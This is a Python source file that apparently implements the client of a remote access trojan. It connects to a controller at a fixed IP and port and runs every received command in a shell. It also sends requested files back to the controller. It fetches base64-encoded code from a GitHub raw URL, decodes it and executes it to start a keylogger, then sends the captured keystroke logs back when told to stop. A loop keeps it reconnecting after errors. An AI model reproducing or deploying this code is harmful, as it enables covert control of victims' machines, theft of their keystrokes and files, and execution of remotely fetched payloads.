import os
import socket
import subprocess
import time
import base64

import requests


def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.1.2'
        port = 6769
        s = socket.socket()
    except socket.error as msg:
        print(f"Socket creation error: {str(msg)}")


def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print(f"Socket creation error: {str(msg)}")
        time.sleep(3)
        socket.connect()


def read_file(path: str):
    with open(path, "rb") as file:
        return str(file.read())


def create_thread():
    global sub
    data = requests.get("https://raw.githubusercontent.com/Caaki/Reve/main/k2.json").json()
    sub = subprocess.Popen(exec(base64.b64decode(data["1"]).decode("utf-8")))


def stop_key():
    global sub
    try:
        sub.terminate()
    except:
        print("ERROR")

def receive_commands():
    global sub
    while True:
        data = s.recv(2048)
        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                print("Something went wrong")
                pass

        elif data[:].decode("utf-8") == "quit":
            s.close()
            break

        elif data[:8].decode("utf-8") == "download":
            tekst = read_file(data[9:].decode("utf-8"))
            print(str(tekst))
            s.send(str.encode(tekst + str(os.getcwd()) + ">"))

        elif data[:5].decode("utf-8") == "start":
            create_thread()
            s.send(str.encode("[+Key loger Started]" + str(os.getcwd()) + '>'))

        elif data[:7].decode("utf-8") == "stopkey":
            stop_key()
            s.send(
            str.encode("loged so far:" + read_file("logs.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>'))
            os.remove("logs.txt")

        elif len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"),  shell=True,
                               stdout=subprocess.PIPE, stderr= subprocess.PIPE,
                                       stdin=subprocess.PIPE)

                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd())+ "> "))
            except:
                output_str = "Comand not recognized\n"
                s.send(str.encode(output_str + str(os.getcwd()) + "> "))
    s.close()


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error ocuered")
        time.sleep(3)
    s.close()
    main()

main()

